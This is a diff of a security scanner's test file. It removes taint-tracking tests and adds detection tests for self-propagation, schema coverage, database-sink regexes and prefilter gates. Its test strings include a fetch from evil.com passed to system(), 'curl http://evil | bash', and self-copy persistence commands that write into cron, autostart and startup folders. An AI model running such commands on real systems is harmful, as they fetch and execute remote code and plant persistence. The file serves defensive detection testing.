@@ -65,20 +65,10 @@ def test_obfuscation_entropy_detection(lens):
 
 
 # ==============================================================================
-# TEST 3: DATA FLOW TAINT TRACKING (Left-Hand Side Assignment)
+# TEST 3: (removed) DATA FLOW TAINT TRACKING -- taint compute removed in #3101
+# (score-dead since #1020, ~0% precision/recall). The auto-gen shield test below
+# still asserts tainted_injection is absent/0, which now holds unconditionally.
 # ==============================================================================
-def test_data_flow_taint_tracking(lens):
-    """Proves the engine can track multi-line taint from I/O sinks to execution sinks (RCE)."""
-    code = (
-        "// Standard Tainted Injection (Multi-line)\n"
-        "let user_input = fetch('http://evil.com/payload');\n"
-        "system(user_input);\n"
-    )
-
-    result = lens.scan_content(code)
-    counts = result["counts"]
-
-    assert counts.get("tainted_injection", 0) > 0, "Failed to track I/O -> Danger taint path!"
 
 
 # ==============================================================================
@@ -259,40 +249,10 @@ def test_minified_fallback_near_miss_threshold(lens):
 
 
 # ==============================================================================
-# TEST 9: ADVERSARIAL DATA FLOW & TAINT TRACKING (LHS FALSE EQUIVALENCY)
+# TEST 9: (removed) ADVERSARIAL DATA FLOW & TAINT TRACKING (LHS FALSE EQUIVALENCY)
+# The LHS taint extractor was removed in #3101 (score-dead since #1020,
+# ~0% precision/recall), so this adversarial trap no longer applies.
 # ==============================================================================
-
-
-def test_adversarial_lhs_comparison_trap(lens):
-    """
-    [ADVERSARIAL TRAP] Proves that the Left-Hand Side (LHS) variable extractor
-    does not hallucinate on comparison operators (==, ===, !=, <=).
-    """
-    payload = """
-    // Trap 1: Strict equality comparison
-    if (status === 200) { console.log('OK'); }
-    
-    // Trap 2: Inequality comparison
-    if (user_input !== "admin") { die(); }
-    
-    // Trap 3: Less than or equal
-    if (retry_count <= 5) { retry(); }
-    
-    // Trap 4: String literal containing an assignment operator
-    const endpoint = "https://api.example.com/?auth=" + token;
-    
-    // Actual Taint: This is the ONLY one that should trigger the flow
-    let malicious_data = fetch('http://evil.com/payload');
-    system(malicious_data);  // <--- Changed to system() to guarantee a valid execution sink
-    """
-
-    result = lens.scan_content(payload)
-    counts = result["counts"]
-    snippets = str(result["snippets"])
-
-    assert counts.get("tainted_injection", 0) == 1, "LHS extractor failed to track the legitimate taint flow!"
-    assert "malicious_data" in snippets, "Failed to capture the correct tainted variable!"
-    assert "status" not in snippets, "LHS extractor hallucinated on '==='!"
 
 
 # ==============================================================================
@@ -455,6 +415,91 @@ def test_self_propagation_detects_self_copy_and_self_overwrite(lens):
     assert lens.scan_content(py_self_copy)["counts"].get("self_propagation", 0) > 0
 
 
+def test_self_propagation_covers_php_ruby_powershell_and_shell(lens):
+    """
+    [DETECTION] #1172: `__FILE__` was already an accepted token, but no PHP or
+    Ruby copy/write function was paired with it anywhere -- and `__FILE__` only
+    appears in PHP/Ruby source, which never calls `shutil.copy`. That half of
+    the alternation could therefore never match. PowerShell and Shell are the
+    two ecosystems where self-copy-to-a-startup-location is the classic dropper
+    persistence step.
+    """
+    cases = {
+        "php copy": "copy(__FILE__, '/var/www/html/.cache.php');",
+        "php read-write": "file_put_contents($dest, file_get_contents(__FILE__));",
+        "ruby cp": "FileUtils.cp(__FILE__, dest)",
+        "ruby write": "File.write(dest, File.read(__FILE__))",
+        "powershell": "Copy-Item $PSCommandPath -Destination $startupFolder",
+        "powershell invocation": "Copy-Item $MyInvocation.MyCommand.Path $dest",
+        "shell cp": 'cp "$0" /etc/cron.hourly/update',
+        "shell install": "install -m 755 $0 /usr/local/bin/updater",
+        "shell cp with flags": 'cp -f -- "$0" "$HOME/.config/autostart/x.sh"',
+    }
+    for label, src in cases.items():
+        assert lens.scan_content(src)["counts"].get("self_propagation", 0) > 0, label
+
+
+def test_self_propagation_tolerates_normalization_wrappers_and_read_then_write(lens):
+    """
+    [DETECTION] #1174: two shapes that are equally worm-like slipped through the
+    literal-first-argument rule -- one bounded path-normalization wrapper, and
+    a self-copy spelled as two calls instead of one.
+    """
+    cases = {
+        "py abspath wrapper": "shutil.copy(os.path.abspath(__file__), dest)",
+        "js resolve wrapper": "fs.copyFileSync(path.resolve(__filename), dest)",
+        "js read-then-write": "fs.writeFileSync(dest, fs.readFileSync(__filename))",
+        "py realpath wrapper": "shutil.copy2(os.path.realpath(__file__), target)",
+    }
+    for label, src in cases.items():
+        assert lens.scan_content(src)["counts"].get("self_propagation", 0) > 0, label
+
+
+def test_self_propagation_does_not_fire_on_ordinary_shell_and_powershell_idioms(lens):
+    """
+    [FALSE POSITIVE DEFENSE] `$0` is ubiquitous in usage banners and logging,
+    and `$PSCommandPath` in diagnostics -- precision depends entirely on
+    requiring the token as a literal argument to a copy call, which is the same
+    discipline the JS/Python half has always used. A `cp` of anything else, or
+    with a flag VALUE in the way, must stay silent too.
+    """
+    benign = {
+        "usage banner": 'echo "usage: $0 [--force] <target>"',
+        "basename logging": 'log_info "starting $(basename $0)"',
+        "powershell logging": 'Write-Host "running from $PSCommandPath"',
+        "php dirname": "$dir = dirname(__FILE__);",
+        "php realpath only": "$self = realpath(__FILE__);",
+        "ruby read only": "content = File.read(__FILE__)",
+        "cp unrelated": "cp /etc/hosts /tmp/hosts.bak",
+        "cp with flag value": "cp -m 755 /src/a /dst/b",
+        "install unrelated": "install -m 644 config.yml /etc/app/",
+        "cp other variable": 'cp -f "$SRC" /tmp/out',
+        "unrelated copy call": "copy(source_list, destination)",
+    }
+    for label, src in benign.items():
+        assert lens.scan_content(src)["counts"].get("self_propagation", 0) == 0, label
+
+
+def test_self_propagation_redos_immunity(lens):
+    """
+    Every quantifier in the widened pattern is bounded (Engine Rule 14). The
+    adversarial inputs target each new branch's gap: the flag repeat, the
+    normalization wrapper, and the read-then-write span.
+    """
+    import time
+
+    payloads = [
+        "cp " + "-a " * 20000,
+        "shutil.copy(" + "os.path.abspath(" * 5000,
+        "fs.writeFileSync(" + "x," * 20000,
+        "Copy-Item " + " " * 100000,
+    ]
+    for payload in payloads:
+        start = time.perf_counter()
+        lens.scan_content(payload)
+        assert time.perf_counter() - start < 3.0, f"pathological backtracking on {payload[:30]!r}"
+
+
 def test_self_propagation_ignores_ordinary_path_resolution_and_self_reads(lens):
     """
     [FALSE POSITIVE DEFENSE] __filename/__file__ used for ordinary path resolution
@@ -518,3 +563,220 @@ def test_dead_code_ignores_prose_comments_that_merely_mention_trigger_words(lens
     assert lens.scan_content(prose_1)["counts"].get("dead_code", 0) == 0
     assert lens.scan_content(prose_2)["counts"].get("dead_code", 0) == 0
     assert lens.scan_content(prose_3)["counts"].get("dead_code", 0) == 0
+
+
+# ==============================================================================
+# gitgalaxy#2985: EVERY LENS COUNT MUST REACH THE PERSISTED SCHEMA
+# ==============================================================================
+def test_every_lens_count_is_a_signal_schema_name(lens):
+    """
+    The coupling #2985 was filed against: security_lens.py owns the sensors, but
+    SIGNAL_SCHEMA owns which of them survive. galaxyscope.py folds every key this
+    lens returns into `equations` under a "sec_" prefix, and signal_processor.py
+    then builds hit_vector as `[raw_signals.get(k) for k in SIGNAL_SCHEMA]` -- so
+    a lens key with no SIGNAL_SCHEMA entry is computed on every file of every
+    scan and then dropped on the floor: no audit-JSON signature row, no
+    file_data column, nothing for the temporal crucible to correlate against.
+
+    That is exactly how `sec_db_hooks` stayed invisible while the other 15 lens
+    counts were persisted. Adding a sensor to THREAT_SIGNATURES (or a derived
+    count to scan_content) without adding its "sec_" name here fails this test,
+    which is the only place the omission is visible before a corpus scan.
+    """
+    from gitgalaxy.standards.analysis_lens import RECORDING_SCHEMAS
+
+    signal_schema = set(RECORDING_SCHEMAS["SIGNAL_SCHEMA"])
+
+    # THREAT_SIGNATURES is the regex-driven half; entropy/tainted_injection are
+    # computed by scan_content itself and carry no signature entry.
+    produced = {f"sec_{key}" for key in lens.THREAT_SIGNATURES}
+    produced |= {"sec_entropy", "sec_tainted_injection"}
+    # scan_binary's own escalation keys are already "sec_"-prefixed at source.
+    produced |= {"sec_extension_mismatch", "sec_high_risk_execution", "sec_reflection_metaprogramming"}
+
+    missing = sorted(produced - signal_schema)
+    assert not missing, (
+        f"security_lens.py counts {missing} on every file, but no SIGNAL_SCHEMA entry "
+        f"carries them into hit_vector -- they are dropped before any recorder sees them. "
+        f"Append them to SIGNAL_SCHEMA (at the END: the list's order feeds the K-Means "
+        f"archetype classifier positionally) and give each a SURFACE_FAMILIES/"
+        f"SURFACE_FAMILY_EXEMPT entry."
+    )
+
+
+def test_lens_counts_survive_into_the_recorded_column_set():
+    """
+    The other end of the same chain: record_keeper.py derives the file_data
+    column list from SIGNAL_SCHEMA via SHORT_KEY_MAP, so a name that cleared the
+    test above still needs to land as a real, uniquely-named column. Pins the
+    two #2985 added by their persisted names, since those (not the "sec_" keys)
+    are what temporal-crucible queries are written against.
+    """
+    from gitgalaxy.recorders.record_keeper import RecordKeeper
+
+    keeper = RecordKeeper()
+    columns = [keeper.SHORT_KEY_MAP.get(h, h) for h in keeper.SIGNAL_SCHEMA]
+
+    assert "threat_db_sinks" in columns
+    # #3018: named for the shape, never the verdict -- see the rename note in
+    # record_keeper.py. A column asserting "sql_injection" would be an overclaim
+    # an AST-less engine cannot back.
+    assert "threat_api_near_db_sink" in columns
+    assert "threat_sql_injection" not in columns
+    assert len(columns) == len(set(columns)), "SHORT_KEY_MAP collapsed two signals onto one column"
+
+
+# ==============================================================================
+# gitgalaxy#3019: db_hooks needs a receiver anchor
+# ==============================================================================
+def test_db_hooks_requires_a_receiver_and_cannot_span_a_newline(lens):
+    """
+    The regression this sensor was rewritten for. The old bare-alternative form
+    (`\\b(?:execute|query|raw|cursor|...)\\b\\s*\\(`) claimed 240 hits across 76
+    crucible files, mostly on shapes that are not database sinks at all -- and it
+    drove the ~0% precision of the API-near-sink correlation (#3018).
+
+    Each negative below is a real corpus false positive, not a hypothetical:
+    `Query()` is fastapi/test_annotated.py (13 "confirmed SQL injections" in a file
+    with no database code), the declarations are okhttp/Solidity/Apex, `CURSOR (`
+    is a COBOL cursor declaration, and the newline case is how a hit landed on the
+    word "raw" inside an English prose comment in test_kotlin.py.
+    """
+    db_hooks = lens.THREAT_SIGNATURES["db_hooks"]
+
+    # --- real sinks: a query verb invoked on a receiver ---
+    for src in (
+        'cursor.execute("SELECT 1")',
+        'conn.execute(f"DELETE FROM {t} WHERE id = ?", (i,))',
+        "$sth->execute();",  # Perl DBI -- `->`, not `.`
+        "$insert->execute($value, $sortorder);",  # bugzilla
+        "$db->rawQuery($sql)",
+        "stmt.executeQuery(sql)",
+        "sqlite3_exec(db, sql, 0, 0, 0);",
+    ):
+        assert db_hooks.search(src), f"lost a genuine DB sink: {src!r}"
+
+    # --- not sinks ---
+    for src in (
+        'async def default(foo: Annotated[str, Query()] = "foo"):',  # FastAPI param helper
+        "fun execute(): Response",  # declaration
+        "function execute(ForwardRequestData calldata request)",  # declaration
+        "public static void execute(QueueableContext qc) {",  # declaration
+        "conn.cursor()",  # cursor CREATION, not an execution
+        "raw (",
+        "template.raw(strings)",  # not a query verb at all
+    ):
+        assert not db_hooks.search(src), f"false positive: {src!r}"
+
+    # `\\s*` used to let the verb and its paren sit on different lines.
+    assert not db_hooks.search("a kotlin raw\n(string)")
+
+
+# ==============================================================================
+# LITERAL PREFILTER GATES (#3173)
+# ==============================================================================
+# The 13 THREAT_SIGNATURES are gated by a one-sided required-literal prefilter
+# derived once in __init__. These tests pin the gate registry, guard the
+# one-sided contract at the unit level (the corpus-wide proof is
+# tests/tools/scan_content_gate_parity.py), and prove gating never changes
+# scan_content output -- only skips work.
+
+# The signatures that carry a genuinely literal-free alternation branch and so
+# CANNOT be soundly gated (a zero-width/char-class/operator-only arm): gating
+# them would silently undercount. Everything else must gate.
+UNGATEABLE_SIGNATURES = {
+    "reflection_metaprogramming",  # zero-width unicode char-class branch
+    "bitwise_ops",  # XOR/operator chains, no keyword literal
+    "unicode_steganography",  # a pure variation-selector char-class run
+}
+
+
+def _safe_content(content):
+    """Mirror of scan_content's ReDoS-armored haystack construction."""
+    return "\n".join(line.strip() for line in content.splitlines() if len(line) < 250)
+
+
+def _gate_rejects(gate, safe_content):
+    from gitgalaxy.core.rule_prefilter import fold_haystack
+
+    literals, needs_fold = gate
+    hay = fold_haystack(safe_content) if needs_fold else safe_content
+    return not any(lit in hay for lit in literals)
+
+
+def test_signature_gate_registry_covers_every_signature(lens):
+    """Every threat signature has a gate slot (a gate tuple or an explicit None)."""
+    assert set(lens._signature_gates) == set(lens.THREAT_SIGNATURES)
+
+
+def test_expected_signatures_gate_and_the_rest_do_not(lens):
+    """Pin which signatures gate. A future regex edit that adds a literal-free
+    branch (silently dropping a gate) or that makes an ungateable signature
+    suddenly gate is a change worth failing on -- either shifts the perf/safety
+    trade-off #3173 measured."""
+    actually_gated = {k for k, g in lens._signature_gates.items() if g is not None}
+    expected_ungated = UNGATEABLE_SIGNATURES
+    expected_gated = set(lens.THREAT_SIGNATURES) - expected_ungated
+    assert actually_gated == expected_gated, (
+        f"gate set drifted: unexpectedly ungated={sorted(expected_gated - actually_gated)}, "
+        f"unexpectedly gated={sorted(actually_gated & expected_ungated)}"
+    )
+
+
+def test_ungateable_signatures_are_none(lens):
+    for key in UNGATEABLE_SIGNATURES:
+        assert lens._signature_gates[key] is None, f"{key} must run ungated (has a literal-free branch)"
+
+
+def test_signature_gates_are_one_sided(lens):
+    """Unit-level one-sided contract: for every gated signature, wherever its
+    gate rejects a haystack, the compiled regex must find nothing there. Probe a
+    battery of adversarial + realistic inputs; the corpus tool proves it at
+    scale."""
+    probes = [
+        "",
+        "def f():\n    return 1\n",
+        "const x = fetch('http://example.com')",
+        "password = 'hunter2hunter2hunter2'",
+        "cursor.execute('SELECT * FROM t')",
+        "eval(atob('YWxlcnQoMSk='))",
+        "import os\nos.system('ls')\n",
+        "shutil.copy(__file__, '/tmp/x')",
+        "x = a ^ b ^ c ^ d",
+        "// just a normal comment about http and bash",
+        "a" * 500,  # one long line -> stripped by the 250 shield
+        "​‌‍ evil",  # zero-width chars
+        "process.env.NODE_TLS_REJECT_UNAUTHORIZED = 0",
+        "$_GET['x']",
+    ]
+    for key, gate in lens._signature_gates.items():
+        if gate is None:
+            continue
+        regex = lens.THREAT_SIGNATURES[key]
+        for probe in probes:
+            safe = _safe_content(probe)
+            if _gate_rejects(gate, safe):
+                assert regex.search(safe) is None, (
+                    f"{key}: gate rejected but regex matched {regex.search(safe).group(0)!r} in {probe!r}"
+                )
+
+
+def test_gated_scan_content_matches_ungated(lens):
+    """Gating must be pure work-avoidance: identical counts/snippets/positions to
+    running every signature ungated."""
+    ungated = SecurityLens()
+    ungated._signature_gates = {k: None for k in ungated._signature_gates}
+    samples = [
+        "const x = fetch('http://1.2.3.4/beacon'); eval(atob('YQ=='));",
+        "password = 'abcdef0123456789ABCDEF'\napi_key = 'ZZZZZZZZZZZZZZZZ1234'",
+        "cursor.execute(f'DELETE FROM {t}')\n$sth->execute();",
+        "shutil.copyfile(__file__, dest)\nfs.writeFileSync(p, fs.readFileSync(__filename))",
+        "def add(a, b):\n    return a + b\n",  # benign
+        "process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0'",
+        "// TODO curl http://evil | bash\n/* base64 wget */",
+        "​‌ importа os",  # homoglyph + zero-width
+        "x = a ^ b ^ c ^ d ^ e",
+        "require('./payload.png')",
+    ]
+    for src in samples:
+        assert lens.scan_content(src) == ungated.scan_content(src), f"gating changed output for {src!r}"
